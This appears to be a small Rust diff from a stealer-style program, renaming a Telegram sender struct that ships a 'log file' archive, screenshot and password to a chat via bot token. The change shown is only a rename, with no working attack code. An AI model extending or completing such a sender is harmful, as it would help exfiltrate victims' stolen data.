@@ -11,7 +11,7 @@ use requests::{write_file_field, write_text_field, BodyRequestBuilder, Multipart
 use utils::format_size;
 
 #[derive(new, Clone)]
-pub struct TelegramBot {
+pub struct TelegramBotSender {
     chat_id: Arc<str>,
     token: Arc<str>
 }
@@ -110,7 +110,7 @@ impl Display for MediaGroup {
     }
 }
 
-impl TelegramBot {
+impl TelegramBotSender {
     fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
         let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");
 
@@ -186,7 +186,7 @@ fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> St
     }
 }
 
-impl LogSender for TelegramBot {
+impl LogSender for TelegramBotSender {
     fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
